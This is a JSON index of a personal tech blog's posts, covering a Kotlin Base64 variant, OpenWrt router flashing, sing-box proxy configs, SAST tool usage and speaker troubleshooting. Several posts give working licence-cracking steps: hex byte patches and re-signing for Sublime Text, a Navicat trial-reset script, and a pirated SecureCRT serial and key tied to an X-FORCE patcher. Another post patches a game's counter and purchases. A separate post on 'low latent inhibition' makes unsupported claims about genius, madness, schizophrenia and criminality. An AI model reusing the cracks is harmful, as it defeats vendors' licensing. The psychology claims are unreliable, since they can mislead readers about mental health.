[{"content":"import java.util.Base64 object MyBase64 { private val H2B = HashMap\u0026lt;Char, Char\u0026gt;() private val B2H = HashMap\u0026lt;Char, Char\u0026gt;() init { val myBase64 = \u0026#34;⣿⣾⣽⣼⣻⣺⣹⣸⣷⣶⣵⣴⣳⣲⣱⣰⣯⣮⣭⣬⣫⣪⣩⣨⣧⣦⣥⣤⣣⣢⣡⣠⣟⣞⣝⣜⣛⣚⣙⣘⣗⣖⣕⣔⣓⣒⣑⣐⣏⣎⣍⣌⣋⣊⣉⣈⣇⣆⣅⣄⣃⣂⣁⣀\u0026#34;.toCharArray() val base64 = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34;.toCharArray() for (i in myBase64.indices) { H2B[myBase64[i]] = base64[i] B2H[base64[i]] = myBase64[i] } } fun encode(bytes: ByteArray): String { val chars = Base64.getEncoder().encodeToString(bytes).toCharArray() val sb = StringBuilder() for (c in chars) { if (c == \u0026#39;=\u0026#39;) continue sb.append(B2H[c]) } return sb.toString() } fun decode(myBase64: String): ByteArray { val chars = myBase64.toCharArray() val sb = StringBuilder() for (c in chars) { sb.append(H2B[c]) } val padding = 4 - (sb.length % 4) if (padding != 4) { repeat(padding) { sb.append(\u0026#39;=\u0026#39;) } } return Base64.getDecoder().decode(sb.toString()) } } fun main() { val encoded = MyBase64.encode(\u0026#34;hello, world! 你好，世界！\u0026#34;.toByteArray()) println(encoded) val decoded = MyBase64.decode(encoded) println(String(decoded)) /* val i = \u0026#39;⣿\u0026#39;.code for (n in 0 until 64) { print(Char(i-n)) } */ } ","permalink":"https://xhstormr.github.io/blog/posts/mybase64/","summary":"","title":"MyBase64"},{"content":" https://store.steampowered.com/app/3419430/Bongo_Cat/\nhttps://github.com/dnSpyEx/dnSpy\nfile Steam\\steamapps\\common\\BongoCat\\BongoCat_Data\\Managed\\Assembly-CSharp.dll -\u0026gt; namespace BongoCat\n修改计数器 this._keysDown += GlobalKeyHook.IsDown.Count((bool x) =\u0026gt; x) * 10000; //修改 自动开箱 this._shopItem.Buy(); //添加 ","permalink":"https://xhstormr.github.io/blog/posts/patch-bongo_cat/","summary":"","title":"Patch Bongo Cat"},{"content":" 避坑 JBL 家的音响产品\n问题：\n使用 AUX 有线连接 JBL Authentics 200 音响，声音断断续续。\n原因：\nJBL 家的音响产品 AUX 输入端需要足够的信号幅度0.7v以上，声音调低后，信号幅度不够，AUX端识别为无信号会关闭，以避免外部干扰进入AUX。 如果输入信号处在临界值，就会断断续续。\n解决：\n调高主机的音量，调低音响的音量，来增加输出端信号的强度。 使用蓝牙、Wi-Fi AirPlay。 持续输出人耳听不见的声音（19Hz-20Hz）。 https://www.szynalski.com/tone-generator/ Reference https://zh.ifixit.com/Answers/View/534339/Speaker+constantly+cuts+off+(AUX) https://www.youtube.com/watch?v=wOpC3-eNXec https://www.zhihu.com/question/646870918/answer/3417776392 https://tieba.baidu.com/p/8869715764 ","permalink":"https://xhstormr.github.io/blog/posts/jbl-authentics-200/","summary":"","title":"JBL Authentics 200 音响"},{"content":" https://openwrt.org/toh/xiaomi/redmi_ax6000\nhttps://firmware-selector.openwrt.org\nhttps://github.com/openwrt/openwrt\nuboot https://cmi.hanwckf.top/p/mt798x-uboot-usage/ https://github.com/hanwckf/bl-mt798x/releases/latest 按住路由器的RESET按钮之后通电，保持至少15秒后松开，路由器会自动进入uboot的failsafe模式，由于uboot没有DHCP功能，需要把电脑的IP地址设置成静态IP 192.168.31.100/24。\n更新固件: http://192.168.31.1/ 更新 uboot: http://192.168.31.1/uboot.html scp -O \u0026#39;/Users/user/Downloads/mt7986_redmi_ax6000-fip-fixed-parts-multi-layout.bin\u0026#39; root@192.168.1.1:/tmp/ opkg update \u0026amp;\u0026amp; opkg install wget kmod-mtd-rw insmod /lib/modules/$(uname -r)/mtd-rw.ko i_want_a_brick=1 mtd write /tmp/mt7986_redmi_ax6000-fip-fixed-parts-multi-layout.bin FIP mtd verify /tmp/mt7986_redmi_ax6000-fip-fixed-parts-multi-layout.bin FIP sing-box https://github.com/SagerNet/sing-box/releases https://github.com/openwrt/packages/blob/master/net/sing-box/files/sing-box.conf opkg update \u0026amp;\u0026amp; opkg install sing-box service sing-box reload service sing-box restart service sing-box status service sing-box info /etc/config/sing-box option enabled \u0026#39;1\u0026#39; option user \u0026#39;root\u0026#39; /etc/sing-box/config.json \u0026#34;inbounds\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;tun\u0026#34;, \u0026#34;address\u0026#34;: [ \u0026#34;172.19.0.1/30\u0026#34; ], \u0026#34;auto_route\u0026#34;: true, \u0026#34;strict_route\u0026#34;: true } ], \u0026#34;experimental\u0026#34;: { \u0026#34;clash_api\u0026#34;: { \u0026#34;external_controller\u0026#34;: \u0026#34;0.0.0.0:9090\u0026#34;, \u0026#34;external_ui\u0026#34;: \u0026#34;dashboard\u0026#34;, // http://192.168.6.1:9090/ui/ \u0026#34;secret\u0026#34;: \u0026#34;123456\u0026#34; } } 关联 tun 接口，分配防火墙区域 Reference https://www.right.com.cn/forum/thread-8261104-1-1.html https://www.right.com.cn/forum/thread-8265832-1-1.html ","permalink":"https://xhstormr.github.io/blog/posts/openwrt_ax6000/","summary":"","title":"OpenWrt Redmi AX6000"},{"content":" Low Latent Inhibition（LLI）由多伦多大学和哈佛大学的心理学研究专家共同发现。该论文发表于2003年九月份Journal of Personality and Social Psychology 。有些人天生就对环境刺激特别敏感，比起普通人，更容易、更快接收和处理更多的信息。\n一般人：只关心红色那一块，虽然外在环境和刺激(stimuli) 有上面四块\nLLI 「低潜在抑制症」 人：外在环境刺激(stimuli) 有四块，同时关心四块（红色）\n如何得知自己是否LLI 「低潜在抑制症」人？ 如果你满足了10项中的8项，很可能属于LLI 「低潜在抑制症」人。出处\n能从生活中各处汲取信息，信息来源的广度超于常人。掌握了某一事物的知识或规律，进而推知同类事物的知识 某类讯息会令你进行深度思考，带有强迫性质 抽象思维能力较强 会通过逻辑，对信息进行判断和整合 分析事物时，比起透过表面，更倾向于深入本质 思维方式极其消耗能量。幼年时期与青年时期常伴有头痛，眩晕 感觉没有人彻底了解你，表现给别人的，都是营造出来的角色 情感常以压抑的方式处理，而不是宣泄的方式。情感表达不真实 对提供更多信息给自己的，或需要自己思考的异性对象，更有好感 较少表达情感，但感知外界情绪能力极强 LLI 「低潜在抑制症」人，其他特征： 如果你满足了8项中的6项，很可能属于LLI 「低潜在抑制症」人。出处\n无数的幼稚问题，接触不同事物会让你失眠 经常恍惚状态 没有人能彻底了解你，表现给别人看的，从来都是自我营造的角色（自闭和多重人格） 感觉脑袋快要爆炸了，思维混乱，有无数的图象或数字 常常把很多责任往自己身上揽，想改变世界上的一切不公平和丑恶 打字的时候，会留意键盘下面的连线、线外面的绝缘材料、塑胶模件等 从来没有异性能进入自己内心，就算别人主动喜欢自己，都会有一种排斥情绪 接触不同的人事物，第一个感觉就是相当幼稚，然后发现自己的幼稚 LLI人和一般人的主要分别 一般人的大脑有「保护装置」，他们压抑潜意识的能力，是LLI人的七倍。他们不会想太多，对外界环境不会太过在意。而LLI人则没有这种「保护装置」，他们压抑潜意识的能力，只有普通人的七份之一。比喻的说，LLI人的脑袋，以一般人的七倍速度转动。 LLI人看似潜力无限，其实很危险。\n如果用动漫人物去形容LLI人，我会选冰雪奇缘(Frozen)里面的艾莎(Elsa)。因害怕自己的魔法失控，会伤害到其他人。她只能拼命地压抑住能力，远离人群。那种孤独和心情，大概只有LLI人才能理解。\nLLI人的优点：大脑的「自动化」运作 一般人视LLI人为天才，尤其高智商LLI人，不论是计算、创造、逻辑、思维能力，都比一般人强得多。 LLI人的信息分析、处理过程完全是「自动化」，他们的观察和分析能力，一般人无法想象。 LLI能从别人的外貌、语言和动作，就能彻底分析到对方的准确性格、生活、习性。他们的另一个优点是「不易学坏」。因他们自我中心的性格，不容易受外界影响而轻易改变自己。他们像是活在自己的世界，关心自己关心的事物，沉迷于自己的思考。\nLLI人的缺点：无限思考，造成精神、生理的巨大负担 就像漫画或小说里的，有超能力的人，没有了解、不懂怎样运用超能力，就会能力失控一样。 LLI人会去思考简单的真理，以及背后的原因。 不论接触到什么东西，脑袋会自动、无限地思考停不下来。这既是一种能力，但同时也是一种苦难。自我意识、思维创造、空间组合能力，在生理和精神层面，带来巨大负担。无法负担的LLI人，会面临精神崩溃。这是个人观点，人在「未知」以及学习的过程中，才会感到有乐趣。但LLI人的学习能力快，当东西都变了「已知」，了解所有细节后，便会对事物快速失去兴趣。这令LLI人失去生活乐趣，容易变得悲观和绝望。 LLI的能力，会令LLI人失去平衡，亦即失去思考能力的平衡，以及生活的平衡。\n现实中的LLI人：内心徘徊于天堂与地狱之间 就如漫画或小说情节一样，LLI人会觉得自己异于常人，不被一般人接纳。除非幸运地找到同类，否则身边没有人，能知道他们究竟在想什么，也没办法进入他们的内心。为了在现实中生存下来，LLI人会表现得和一般人没分别。表面上看起来，LLI人甚至比一般人还坚强，但内心却极度脆弱。他们一直在生活中演戏，演出最强大的一面，直到完全崩溃为止。在感情上，LLI人相当细腻。因自我意识的保护，他们不能接受感情，也认为自己不需要感情。他们很难表达感情，只能一直武装，保护脆弱的内心。他们悲观、易怒、思想压力极大，每天都像在崩溃的边缘。到有一天再装不下去时，也就是他们崩溃的时刻。\nLLI的平常生活中通常没有什么知心者，也不多交好的朋友，原因在于他们不可捉摸的内心和随时变化的人格、假面。以及他们自身独特的认知方式，和行为方式。与常人不同的举动让他们看起来像是一个异类。因此可能受到部分人的排斥。这也加剧了他们对于人性的思考，从而也加剧了他们的症状。出处\n更糟的是，LLI人会不断的否定自己的信念，所谓「完美主义是自虐的最高境界」。 「你所向往的价值观，逾越了社会的潜规则」、「理想主义最终成为人际阻力」。LLI人是「上了天堂却俯视着地狱，下了地狱却抬不了头」。出处\n两类LLI人：天才和疯子只有一线之差 会产生两类LLI人。一种是接受，并努力发挥这种能力，也就是「天才」。一种是认为自己已接近疯狂，尽力抵制和反抗这种能力，也就是「疯子」。成功克服了的人，了解、懂得怎样运用能力。他们一般意志非常坚强，智商很高。而不了解、不懂得怎样运用能力，未能克服的人，只能继续忍受、挣扎，很可能下场是进精神病院，甚至自杀。 LLI人的正面职业：艺术家，工程师，科学家。 LLI人的负面职业：杀人狂、诈骗师、智能犯。出处\nKeyword 渐进式思维 VS 跳跃式思维 人的思维方式有两种：渐进式思维（一般人），以及跳跃式思维(LLI人）。一般人的渐进式思维，令他们将注意力，停留在一个问题点上，而且不会深究。 LLI人的跳跃式思维，令他们将注意力，停留在多个问题点上（多个讯息分支），而且会不断深究（讯息分支再分出细节）。没有思考力、控制力的LLI人，会出现严重的问题，就是心理和生理上，被庞大的信息量所消耗。出处\n网状思维 LLI人思维是网状思维，如蜘蛛网、棋盘般的形状。他们思绪跳来跳去，如蜘蛛或棋子般，左右行走或跳跃。一般人跟不上这样的思路。\n「高智商反社会」人格 LLI低潜在抑制症文章内有提及。由于LLI在生活中很少见，有一些精神疾病的症状与其相似，因为该症状并非广为人所知，甚至有许多医生都不知晓该症状的具体信息。更甚者闻所未闻。部分LLI的患者会被直接当做精神病送往医院治疗。然而这不仅没有用处，更会导致他们的病症加剧，怀疑身边的人，怀疑社会等等，从而产生反社会人格，对社会产生危害。出处\n精神官能症 精神官能症 属于功能性心理障碍的一类。想太多的人，精神层面过于活跃，观察力和感官系统都非常敏锐。\n多重人格/精神分裂 LLI低潜在抑制症会引发一系列幻想，想象内容的程度非常大，低于平均智商或年纪偏小的人，可能无法承受，引致精神分裂。\nReference https://psycnet.apa.org/record/2010-16421-001 https://baike.baidu.com/item/%E4%BD%8E%E6%BD%9C%E5%9C%A8%E6%8A%91%E5%88%B6%E7%97%87/10807860# https://www.zhihu.com/question/301999320/answer/1810481778 https://www.zhihu.com/question/29286285/answer/1897706881 https://www.zhihu.com/question/460088893/answer/1913380876 https://zhuanlan.zhihu.com/p/541169016 https://hauy.wordpress.com/2007/10/19/%E4%BD%8E%E6%BD%9C%E5%9C%A8%E6%8A%91%E5%88%B6%E7%97%87-low-latent-inhibition/ https://www.douban.com/note/90440925/?_i=7318883pIOHUBR https://vocus.cc/article/650dceabfd89780001ae13aa ","permalink":"https://xhstormr.github.io/blog/posts/lli/","summary":"","title":"低潜在抑制症"},{"content":" https://github.com/SagerNet/sing-box\nhttps://sing-box.sagernet.org/zh/configuration/\nNote: rules 中的规则越靠前（上），优先级就越高。\n{ \u0026#34;log\u0026#34;: { \u0026#34;level\u0026#34;: \u0026#34;info\u0026#34; }, \u0026#34;inbounds\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;tun\u0026#34;, // 透明代理 \u0026#34;address\u0026#34;: [ \u0026#34;172.19.0.1/30\u0026#34; ], \u0026#34;auto_route\u0026#34;: true, \u0026#34;strict_route\u0026#34;: true }, { \u0026#34;type\u0026#34;: \u0026#34;mixed\u0026#34;, // SOCKS5 HTTP 代理 \u0026#34;listen\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;listen_port\u0026#34;: 1080, \u0026#34;set_system_proxy\u0026#34;: true } ], \u0026#34;outbounds\u0026#34;: [ { \u0026#34;tag\u0026#34;: \u0026#34;自选\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;selector\u0026#34;, \u0026#34;default\u0026#34;: \u0026#34;台湾2024-1\u0026#34;, \u0026#34;outbounds\u0026#34;: [ \u0026#34;香港2024-1\u0026#34;, \u0026#34;香港2024-2\u0026#34;, \u0026#34;台湾2024-1\u0026#34;, \u0026#34;首尔\u0026#34;, \u0026#34;东京\u0026#34;, \u0026#34;洛杉矶\u0026#34;, \u0026#34;悉尼\u0026#34;, \u0026#34;墨尔本\u0026#34;, \u0026#34;法兰克福\u0026#34;, \u0026#34;巴林\u0026#34;, \u0026#34;德里\u0026#34;, \u0026#34;孟买1\u0026#34;, \u0026#34;孟买2\u0026#34;, \u0026#34;雅加达\u0026#34;, \u0026#34;自动\u0026#34; ] }, { \u0026#34;tag\u0026#34;: \u0026#34;自动\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;urltest\u0026#34;, \u0026#34;interval\u0026#34;: \u0026#34;3m\u0026#34;, \u0026#34;outbounds\u0026#34;: [ \u0026#34;香港2024-1\u0026#34;, \u0026#34;香港2024-2\u0026#34;, \u0026#34;台湾2024-1\u0026#34;, \u0026#34;首尔\u0026#34;, \u0026#34;东京\u0026#34;, \u0026#34;洛杉矶\u0026#34;, \u0026#34;悉尼\u0026#34;, \u0026#34;墨尔本\u0026#34;, \u0026#34;法兰克福\u0026#34;, \u0026#34;巴林\u0026#34;, \u0026#34;德里\u0026#34;, \u0026#34;孟买1\u0026#34;, \u0026#34;孟买2\u0026#34;, \u0026#34;雅加达\u0026#34; ] }, { \u0026#34;tag\u0026#34;: \u0026#34;香港2024-1\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;trojan\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123456\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;liads.wsone.icu\u0026#34;, \u0026#34;server_port\u0026#34;: 443, \u0026#34;tls\u0026#34;: { \u0026#34;enabled\u0026#34;: true, \u0026#34;server_name\u0026#34;: \u0026#34;liads.wsone.icu\u0026#34;, \u0026#34;insecure\u0026#34;: true, \u0026#34;utls\u0026#34;: { \u0026#34;enabled\u0026#34;: true, \u0026#34;fingerprint\u0026#34;: \u0026#34;firefox\u0026#34; } } }, { \u0026#34;tag\u0026#34;: \u0026#34;直连\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;direct\u0026#34; } ], \u0026#34;dns\u0026#34;: { \u0026#34;strategy\u0026#34;: \u0026#34;ipv4_only\u0026#34;, \u0026#34;servers\u0026#34;: [ { \u0026#34;tag\u0026#34;: \u0026#34;remote\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;https\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;9.9.9.9\u0026#34;, \u0026#34;detour\u0026#34;: \u0026#34;自选\u0026#34; }, { \u0026#34;tag\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;https\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;223.5.5.5\u0026#34; } ], \u0026#34;rules\u0026#34;: [ { \u0026#34;clash_mode\u0026#34;: \u0026#34;Direct\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;local\u0026#34; }, { \u0026#34;clash_mode\u0026#34;: \u0026#34;Global\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;remote\u0026#34; }, { \u0026#34;rule_set\u0026#34;: \u0026#34;geosite-category-ads-all\u0026#34;, \u0026#34;action\u0026#34;: \u0026#34;reject\u0026#34; }, { \u0026#34;rule_set\u0026#34;: \u0026#34;geosite-cn\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;local\u0026#34; } ] }, \u0026#34;route\u0026#34;: { \u0026#34;auto_detect_interface\u0026#34;: true, \u0026#34;default_domain_resolver\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;rules\u0026#34;: [ { \u0026#34;action\u0026#34;: \u0026#34;sniff\u0026#34; }, { \u0026#34;protocol\u0026#34;: \u0026#34;dns\u0026#34;, \u0026#34;action\u0026#34;: \u0026#34;hijack-dns\u0026#34; }, { \u0026#34;ip_is_private\u0026#34;: true, \u0026#34;outbound\u0026#34;: \u0026#34;直连\u0026#34; }, { \u0026#34;clash_mode\u0026#34;: \u0026#34;Direct\u0026#34;, \u0026#34;outbound\u0026#34;: \u0026#34;直连\u0026#34; }, { \u0026#34;clash_mode\u0026#34;: \u0026#34;Global\u0026#34;, \u0026#34;outbound\u0026#34;: \u0026#34;自选\u0026#34; }, { \u0026#34;domain\u0026#34;: \u0026#34;services.googleapis.cn\u0026#34;, // Google Play 应用更新 \u0026#34;outbound\u0026#34;: \u0026#34;自选\u0026#34; }, { \u0026#34;rule_set\u0026#34;: [ \u0026#34;geosite-category-ads-all\u0026#34; ], \u0026#34;action\u0026#34;: \u0026#34;reject\u0026#34; }, { \u0026#34;rule_set\u0026#34;: [ \u0026#34;geoip-cn\u0026#34;, \u0026#34;geosite-cn\u0026#34;, \u0026#34;geosite-tld-cn\u0026#34;, \u0026#34;geosite-category-games-cn\u0026#34;, \u0026#34;geosite-category-companies@cn\u0026#34;, \u0026#34;geosite-connectivity-check\u0026#34;, \u0026#34;geosite-private\u0026#34; ], \u0026#34;outbound\u0026#34;: \u0026#34;直连\u0026#34; } ], \u0026#34;rule_set\u0026#34;: [ { \u0026#34;tag\u0026#34;: \u0026#34;geoip-cn\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;remote\u0026#34;, \u0026#34;format\u0026#34;: \u0026#34;binary\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://raw.githubusercontent.com/SagerNet/sing-geoip/rule-set/geoip-cn.srs\u0026#34;, \u0026#34;download_detour\u0026#34;: \u0026#34;自选\u0026#34; }, { \u0026#34;tag\u0026#34;: \u0026#34;geosite-cn\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;remote\u0026#34;, \u0026#34;format\u0026#34;: \u0026#34;binary\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://raw.githubusercontent.com/SagerNet/sing-geosite/rule-set/geosite-geolocation-cn.srs\u0026#34;, \u0026#34;download_detour\u0026#34;: \u0026#34;自选\u0026#34; }, { \u0026#34;tag\u0026#34;: \u0026#34;geosite-tld-cn\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;remote\u0026#34;, \u0026#34;format\u0026#34;: \u0026#34;binary\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://raw.githubusercontent.com/SagerNet/sing-geosite/rule-set/geosite-tld-cn.srs\u0026#34;, \u0026#34;download_detour\u0026#34;: \u0026#34;自选\u0026#34; }, { \u0026#34;tag\u0026#34;: \u0026#34;geosite-category-games-cn\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;remote\u0026#34;, \u0026#34;format\u0026#34;: \u0026#34;binary\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://raw.githubusercontent.com/SagerNet/sing-geosite/rule-set/geosite-category-games-cn.srs\u0026#34;, \u0026#34;download_detour\u0026#34;: \u0026#34;自选\u0026#34; }, { \u0026#34;tag\u0026#34;: \u0026#34;geosite-category-ads-all\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;remote\u0026#34;, \u0026#34;format\u0026#34;: \u0026#34;binary\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://raw.githubusercontent.com/SagerNet/sing-geosite/rule-set/geosite-category-ads-all.srs\u0026#34;, \u0026#34;download_detour\u0026#34;: \u0026#34;自选\u0026#34; }, { \u0026#34;tag\u0026#34;: \u0026#34;geosite-category-companies@cn\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;remote\u0026#34;, \u0026#34;format\u0026#34;: \u0026#34;binary\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://raw.githubusercontent.com/SagerNet/sing-geosite/rule-set/geosite-category-companies@cn.srs\u0026#34;, \u0026#34;download_detour\u0026#34;: \u0026#34;自选\u0026#34; }, { \u0026#34;tag\u0026#34;: \u0026#34;geosite-connectivity-check\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;remote\u0026#34;, \u0026#34;format\u0026#34;: \u0026#34;binary\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://raw.githubusercontent.com/SagerNet/sing-geosite/rule-set/geosite-connectivity-check.srs\u0026#34;, \u0026#34;download_detour\u0026#34;: \u0026#34;自选\u0026#34; }, { \u0026#34;tag\u0026#34;: \u0026#34;geosite-private\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;remote\u0026#34;, \u0026#34;format\u0026#34;: \u0026#34;binary\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://raw.githubusercontent.com/SagerNet/sing-geosite/rule-set/geosite-private.srs\u0026#34;, \u0026#34;download_detour\u0026#34;: \u0026#34;自选\u0026#34; } ] }, \u0026#34;experimental\u0026#34;: { \u0026#34;cache_file\u0026#34;: { \u0026#34;enabled\u0026#34;: true }, \u0026#34;clash_api\u0026#34;: { \u0026#34;external_controller\u0026#34;: \u0026#34;127.0.0.1:9090\u0026#34;, \u0026#34;secret\u0026#34;: \u0026#34;123456\u0026#34;, \u0026#34;access_control_allow_origin\u0026#34;: [ \u0026#34;https://yacd.haishan.me\u0026#34;, \u0026#34;https://yacd.metacubex.one\u0026#34;, \u0026#34;https://metacubexd.pages.dev\u0026#34; ] } } } ","permalink":"https://xhstormr.github.io/blog/posts/sing-box/","summary":"","title":"sing-box"},{"content":" Sublime Text Build 4152\nhttps://www.sublimetext.com/download\nhttps://hexed.it/\n80 78 05 00 0F 94 C1 -\u0026gt; C6 40 05 01 48 85 C9 Patch /Applications/\u0026#39;Sublime Text.app\u0026#39;/Contents/MacOS/sublime_text Sign codesign --force --deep --sign - /Applications/\u0026#39;Sublime Text.app\u0026#39; Config curl -o ~/Library/\u0026#39;Application Support/Sublime Text\u0026#39;/Packages/User/Dracula.tmTheme https://raw.githubusercontent.com/dracula/sublime/master/Dracula.tmTheme Preferences.sublime-settings { \u0026#34;color_scheme\u0026#34;: \u0026#34;Packages/User/Dracula.tmTheme\u0026#34;, \u0026#34;font_face\u0026#34;: \u0026#34;JetBrainsMono Nerd Font\u0026#34;, \u0026#34;font_size\u0026#34;: 13, \u0026#34;word_wrap\u0026#34;: false, \u0026#34;highlight_line\u0026#34;: true, \u0026#34;highlight_modified_tabs\u0026#34;: true, \u0026#34;match_brackets_angle\u0026#34;: true, \u0026#34;fade_fold_buttons\u0026#34;: false, \u0026#34;save_on_focus_lost\u0026#34;: true, \u0026#34;translate_tabs_to_spaces\u0026#34;: true, \u0026#34;ensure_newline_at_eof_on_save\u0026#34;: true, \u0026#34;always_show_minimap_viewport\u0026#34;: true, \u0026#34;draw_minimap_border\u0026#34;: true, \u0026#34;draw_white_space\u0026#34;: \u0026#34;all\u0026#34;, \u0026#34;trim_trailing_white_space_on_save\u0026#34;: \u0026#34;all\u0026#34;, \u0026#34;caret_style\u0026#34;: \u0026#34;blink\u0026#34;, \u0026#34;rulers\u0026#34;: [[80, \u0026#34;stippled\u0026#34;]], \u0026#34;update_check\u0026#34;: false, } Reference https://gist.github.com/opastorello/4d494d627ec9012367028c89cb7a1945 https://gist.github.com/maboloshi/feaa63c35f4c2baab24c9aaf9b3f4e47 ","permalink":"https://xhstormr.github.io/blog/posts/patch-sublimetext/","summary":"","title":"Patch Sublime Text"},{"content":" Mac: https://download.navicat.com/download/navicat17_premium_cs.dmg\nWindows: https://download.navicat.com/download/navicat17_premium_cs_x64.exe\n#!/bin/bash #/usr/libexec/PlistBuddy -c \u0026#39;Print\u0026#39; ~/Library/Preferences/com.navicat.NavicatPremium.plist /usr/libexec/PlistBuddy -c \u0026#39;Delete :91F6C435D172C8163E0689D3DAD3F3E9\u0026#39; ~/Library/Preferences/com.navicat.NavicatPremium.plist /usr/libexec/PlistBuddy -c \u0026#39;Delete :B966DBD409B87EF577C9BBF3363E9614\u0026#39; ~/Library/Preferences/com.navicat.NavicatPremium.plist rm -rf ~/\u0026#39;Library/Application Support/PremiumSoft CyberTech/Navicat CC/Navicat Premium/\u0026#39;.* ","permalink":"https://xhstormr.github.io/blog/posts/navicat-reset/","summary":"","title":"Navicat Reset"},{"content":" Mac 版本和 Windows 的注册机通用，Python 跨平台编译，搜索特征字符串进行替换。\nBundle : scrt-sfx-9.3.1-2929.macos_x64.dmg Patcher: xf-vdkkg.exe License: Version: SecureCRT and SecureFX 9.3.1 (x64 build 2929) Name: X-FORCE Serial Number: 13-85-324670 License Key: AC9TQJ 6TR1SE ZQ1AQ8 MBBGEM ADED1M E28774 QPQ8TJ NP3MQW Issue Date: 01-29-2023 Config: /Users/user/Library/Application Support/VanDyke/SecureCRT/ Patch /Applications/SecureFX.app/Contents/MacOS/SecureFX /Applications/SecureCRT.app/Contents/MacOS/SecureCRT Sign codesign --force --deep --sign - /Applications/SecureCRT.app codesign --force --deep --sign - /Applications/SecureFX.app Reference https://www.unix.com/man-page/osx/1/codesign/ ","permalink":"https://xhstormr.github.io/blog/posts/patch-securecrt/","summary":"","title":"Patch SecureCRT + SecureFX Bundle"},{"content":"Updated on 2022-04-18\nStatic Application Security Testing\nhttps://docs.github.com/zh/code-security/guides\nSemgrep https://github.com/returntocorp/semgrep https://github.com/returntocorp/semgrep-rules python3 -m pip install --index-url=https://mirrors.aliyun.com/pypi/simple/ --upgrade semgrep semgrep scan --verbose --disable-version-check --metrics off --scan-unknown-extensions --config r/java --config r/contrib.owasp.java --sarif -o semgrep-result.sarif.json \u0026#39;/Users/user/Documents/IdeaProjects/text-masker/\u0026#39; CodeQL https://codeql.github.com/docs https://github.com/github/codeql-action/releases/latest https://github.com/github/codeql https://github.com/github/codeql-cli-binaries xcode-select --install ./codeql version ./codeql resolve qlpacks ./codeql resolve languages mkdir db ./codeql database create ./db/text-masker --language java --command \u0026#39;./gradlew classes --no-daemon --rerun-tasks\u0026#39; --source-root \u0026#39;/Users/user/Documents/IdeaProjects/text-masker/\u0026#39; ./codeql database upgrade ./db/text-masker ./codeql database analyze ./db/text-masker --format sarif-latest --output codeql-result.sarif.json codeql/java/ql/src/Security/CWE/CWE-798/HardcodedCredentialsApiCall.ql Gitleaks https://github.com/gitleaks/gitleaks gitleaks detect -v -f sarif -r gitleaks-result.sarif.json -s \u0026#39;/Users/user/Documents/IdeaProjects/text-masker/\u0026#39; Gosec https://github.com/securego/gosec gosec -no-fail -fmt sarif -out gosec-result.sarif.json \u0026#39;/Users/user/Documents/IdeaProjects/text-masker/...\u0026#39; KICS https://github.com/Checkmarx/kics https://github.com/Checkmarx/kics/blob/master/Dockerfile kics scan --no-progress --report-formats \u0026#39;sarif,html,pdf\u0026#39; --output-name kics-result -o ./ -p \u0026#39;/Users/user/Documents/IdeaProjects/text-masker/\u0026#39; SARIF Format https://sarif.info/Validation https://microsoft.github.io/sarif-web-component Reference Other code scanning tools https://github.com/SonarSource/sonarqube ","permalink":"https://xhstormr.github.io/blog/posts/sast/","summary":"","title":"SAST"},{"content":"Updated on 2021-11-04\nhttps://editor.swagger.io https://petstore.swagger.io https://api.openapi-generator.tech/index.html https://swagger.io/docs/specification/basic-structure/ https://github.com/OAI/OpenAPI-Specification ","permalink":"https://xhstormr.github.io/blog/posts/openapi/","summary":"","title":"OpenAPI"},{"content":"Updated on 2021-08-18\nhttps://github.com/alacritty/alacritty\nenv: TERM: screen-256color shell: program: /usr/local/Caskroom/miniconda/base/bin/fish window: startup_mode: Maximized dynamic_title: true font: size: 14 normal: family: JetBrainsMono Nerd Font bell: animation: EaseOutSine duration: 600 color: \u0026#39;#4e4e4e\u0026#39; mouse_bindings: - { mouse: Middle, action: PasteSelection } background_opacity: 0.9 draw_bold_text_with_bright_colors: true key_bindings: - { key: A, mods: Alt, chars: \u0026#34;\\x1ba\u0026#34; } - { key: B, mods: Alt, chars: \u0026#34;\\x1bb\u0026#34; } - { key: C, mods: Alt, chars: \u0026#34;\\x1bc\u0026#34; } - { key: D, mods: Alt, chars: \u0026#34;\\x1bd\u0026#34; } - { key: E, mods: Alt, chars: \u0026#34;\\x1be\u0026#34; } - { key: F, mods: Alt, chars: \u0026#34;\\x1bf\u0026#34; } - { key: G, mods: Alt, chars: \u0026#34;\\x1bg\u0026#34; } - { key: H, mods: Alt, chars: \u0026#34;\\x1bh\u0026#34; } - { key: I, mods: Alt, chars: \u0026#34;\\x1bi\u0026#34; } - { key: J, mods: Alt, chars: \u0026#34;\\x1bj\u0026#34; } - { key: K, mods: Alt, chars: \u0026#34;\\x1bk\u0026#34; } - { key: L, 